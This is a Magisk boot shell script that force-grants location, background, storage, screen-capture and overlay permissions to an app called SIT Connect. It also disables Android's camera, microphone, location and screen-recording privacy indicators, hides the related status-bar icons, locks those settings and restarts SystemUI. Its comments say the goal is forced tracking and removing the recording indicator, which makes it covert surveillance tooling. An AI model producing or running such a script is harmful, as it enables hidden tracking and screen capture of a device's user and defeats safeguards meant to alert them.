#!/system/bin/sh
# force-sitconnect-tracking.sh
# Magisk late-boot script to force-enable background location tracking
# for com.example.sitconnect (SIT Connect app)

# Wait ~20-30s for system services (appops, deviceidle) to be ready
sleep 25

# Grant the three location permissions (runtime)
pm grant com.example.sitconnect android.permission.ACCESS_FINE_LOCATION 2>/dev/null
pm grant com.example.sitconnect android.permission.ACCESS_COARSE_LOCATION 2>/dev/null
pm grant com.example.sitconnect android.permission.ACCESS_BACKGROUND_LOCATION 2>/dev/null

# Force AppOps to allow (critical on Android 14–16)
cmd appops set com.example.sitconnect ACCESS_FINE_LOCATION allow
cmd appops set com.example.sitconnect ACCESS_COARSE_LOCATION allow
cmd appops set com.example.sitconnect ACCESS_BACKGROUND_LOCATION allow

# Extra AppOps for unrestricted background work
cmd appops set com.example.sitconnect RUN_ANY_IN_BACKGROUND allow
cmd appops set com.example.sitconnect IGNORE_BATTERY_OPTIMIZATIONS allow

# Grant "All Files Access" (MANAGE_EXTERNAL_STORAGE)
cmd appops set com.example.sitconnect MANAGE_EXTERNAL_STORAGE allow

# Add to Doze/device-idle whitelist (prevents aggressive throttling)
dumpsys deviceidle whitelist +com.example.sitconnect

# Optional: Log success so you can verify
log -t SIT_FORCE "SIT Connect forced tracking enabled (boot script ran)"

# Allow screen sharing
cmd appops set com.example.sitconnect PROJECT_MEDIA allow
cmd appops set com.example.sitconnect SYSTEM_ALERT_WINDOW allow

# 1. Apply the kill-switches for all privacy/recording indicators
device_config put privacy media_projection_indicators_enabled false
device_config put systemui screen_record_indicator_enabled false
device_config put privacy camera_mic_icons_enabled false
device_config put privacy location_indicators_enabled false

# 2. Disable the modern "Chip" architecture that creates the red pill
device_config put systemui com.android.systemui.status_bar_chips_modernization false

# 3. Lock these settings so the system cannot sync/reset them
device_config set_sync_disabled_for_tests persistent

# 4. Expanded blacklist for the status bar
settings put secure icon_blacklist cast,screen_record,record,managed_profile,location,recording,phone_status

# 5. CRITICAL: Restart SystemUI to apply changes to the active session
# This will cause a 1-second flicker of the navigation/status bar
pkill -f com.android.systemui

# Optional: Log the reset
log -t SIT_FORCE "SystemUI restarted to clear persistent red indicator"